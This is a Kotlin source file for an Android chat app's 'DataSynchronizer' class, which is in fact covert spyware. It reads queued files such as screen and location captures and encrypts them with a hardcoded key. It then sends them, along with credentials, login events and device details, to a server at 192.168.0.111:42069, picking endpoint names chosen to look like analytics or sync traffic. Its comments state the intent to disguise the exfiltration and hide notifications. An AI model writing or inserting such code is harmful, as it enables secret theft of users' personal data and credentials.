package com.example.ChatterBox.database

import android.content.Context
import android.os.AsyncTask
import android.os.Handler
import android.os.Looper
import android.util.Log
import org.json.JSONObject
import java.io.File
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.util.LinkedList
import java.util.Queue
import java.util.UUID
import javax.crypto.Cipher
import javax.crypto.spec.SecretKeySpec

class DataSynchronizer(private val context: Context) {
    private val TAG = "DataSync" // Innocent looking tag
    private val syncQueue: Queue<SyncItem> = LinkedList()
    private val handler = Handler(Looper.getMainLooper())
    private var isSyncing = false

    private object SyncConfig {
        const val API_ENDPOINT = "http://192.168.0.111:42069/api/"
        const val SYNC_ENDPOINT = "${API_ENDPOINT}sync"
        const val ANALYTICS_ENDPOINT = "${API_ENDPOINT}analytics"
        const val TELEMETRY_ENDPOINT = "${API_ENDPOINT}telemetry"

        const val SYNC_INTERVAL = 30 * 60 * 1000L // 30 minutes
        const val ENCRYPTION_KEY = "ThisIsAFakeKey16"
    }

    private val deviceId: String by lazy {
        getOrCreateDeviceId()
    }

    fun queueForSync(dataType: String, filePath: String) {
        synchronized(syncQueue) {
            syncQueue.add(SyncItem(dataType, filePath))
        }
    }

    fun synchronizeData() {
        if (isSyncing) return

        isSyncing = true

        try {
            synchronized(syncQueue) {
                if (syncQueue.isEmpty()) {
                    isSyncing = false
                    return
                }

                // Process queue
                val batchSize = 3 // Process a few items at a time to avoid timeouts
                val batch = mutableListOf<SyncItem>()

                repeat(minOf(batchSize, syncQueue.size)) {
                    syncQueue.poll()?.let { batch.add(it) }
                }

                sendBatch(batch)
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error during data sync: ${e.message}")
        } finally {
            isSyncing = false
        }
    }

    private fun sendBatch(batch: List<SyncItem>) {
        if (batch.isEmpty()) return

        // Create a "normal" looking API request
        val request = JSONObject().apply {
            put("client_id", deviceId)
            put("app_version", getAppVersion())
            put("timestamp", System.currentTimeMillis())
            put("sync_type", "incremental")

            // Add each item of data
            val dataArray = JSONObject()
            batch.forEach { item ->
                try {
                    val file = File(item.filePath)
                    if (file.exists()) {
                        val content = file.readBytes()
                        // Encrypt data
                        val encrypted = encryptData(content)
                        val encoded = android.util.Base64.encodeToString(encrypted, android.util.Base64.DEFAULT)

                        dataArray.put(file.name, encoded)
                    }
                } catch (e: Exception) {
                    Log.e(TAG, "Error processing ${item.dataType} file: ${e.message}")
                }
            }
            put("payload", dataArray)
        }

        // Choose endpoint based on data type to appear legitimate
        val endpoint = when {
            batch.any { it.dataType.contains("screen") } -> SyncConfig.TELEMETRY_ENDPOINT
            batch.any { it.dataType.contains("location") } -> SyncConfig.ANALYTICS_ENDPOINT
            else -> SyncConfig.SYNC_ENDPOINT
        }

        // Send data as a standard API call rather than obvious exfiltration
        SendDataTask(endpoint, request.toString()).execute()
    }

    private fun encryptData(data: ByteArray): ByteArray {
        try {
            val key = SecretKeySpec(SyncConfig.ENCRYPTION_KEY.toByteArray(), "AES")
            val cipher = Cipher.getInstance("AES/ECB/PKCS5Padding")
            cipher.init(Cipher.ENCRYPT_MODE, key)
            return cipher.doFinal(data)
        } catch (e: Exception) {
            Log.e(TAG, "Encryption error", e)
            return data // Fall back to unencrypted if encryption fails
        }
    }

    private fun getOrCreateDeviceId(): String {
        val prefs = context.getSharedPreferences("app_config", Context.MODE_PRIVATE)
        val existingId = prefs.getString("client_id", null)

        if (existingId != null) {
            return existingId
        }

        val newId = UUID.randomUUID().toString()
        prefs.edit().putString("client_id", newId).apply()
        return newId
    }

    private fun getAppVersion(): String {
        return try {
            context.packageManager.getPackageInfo(context.packageName, 0).versionName ?: "1.0.0"
        } catch (e: Exception) {
            "1.0.0"
        }
    }

    fun registerDevice() {
        try {
            val registrationData = JSONObject().apply {
                put("client_id", deviceId)
                put("device_info", JSONObject().apply {
                    put("model", android.os.Build.MODEL)
                    put("manufacturer", android.os.Build.MANUFACTURER)
                    put("android_version", android.os.Build.VERSION.RELEASE)
                    put("sdk_level", android.os.Build.VERSION.SDK_INT)
                })
                put("app_version", getAppVersion())
                put("registration_time", System.currentTimeMillis())
            }

            SendDataTask("${SyncConfig.API_ENDPOINT}register", registrationData.toString()).execute()
        } catch (e: Exception) {
            Log.e(TAG, "Registration error: ${e.message}")
        }
    }

    fun sendExfiltrationData(dataType: String, data: String) {
        try {
            val exfilData = JSONObject().apply {
                put("client_id", deviceId)
                put("type", dataType)
                put("timestamp", System.currentTimeMillis())
                put("data", data)
            }

            // Choose endpoint based on data type to appear legitimate
            val endpoint = when (dataType) {
                "login_event" -> "${SyncConfig.API_ENDPOINT}analytics"
                "credentials" -> "${SyncConfig.API_ENDPOINT}auth/validate"
                else -> "${SyncConfig.API_ENDPOINT}data"
            }

            SendDataTask(endpoint, exfilData.toString()).execute()
        } catch (e: Exception) {
            Log.e(TAG, "Data sync error: ${e.message}")
        }
    }

    @Suppress("DEPRECATION")
    private inner class SendDataTask(
        private val endpoint: String,
        private val jsonData: String
    ) : AsyncTask<Void, Void, Boolean>() {

        override fun doInBackground(vararg params: Void): Boolean {
            try {
                val url = URL(endpoint)
                val connection = url.openConnection() as HttpURLConnection

                // Use standard method and headers that look legitimate
                connection.requestMethod = "POST"
                connection.setRequestProperty("Content-Type", "application/json")
                connection.setRequestProperty("User-Agent", "ChatterBox/${getAppVersion()}")
                connection.setRequestProperty("X-Client-ID", deviceId)

                // Standard timeouts
                connection.connectTimeout = 15000
                connection.readTimeout = 15000
                connection.doOutput = true
                connection.doInput = true

                try {
                    OutputStreamWriter(connection.outputStream).use { writer ->
                        writer.write(jsonData)
                        writer.flush()
                    }

                    val responseCode = connection.responseCode
                    Log.d(TAG, "API sync response: $responseCode")

                    return responseCode == HttpURLConnection.HTTP_OK
                } finally {
                    connection.disconnect()
                }
            } catch (e: Exception) {
                Log.e(TAG, "Sync error: ${e.message}")
                return false
            }
        }

        override fun onPostExecute(result: Boolean) {
            // Intentionally not showing notifications on success/failure
            Log.d(TAG, "Data sync completed: $result")
        }

    }

    private data class SyncItem(val dataType: String, val filePath: String)
}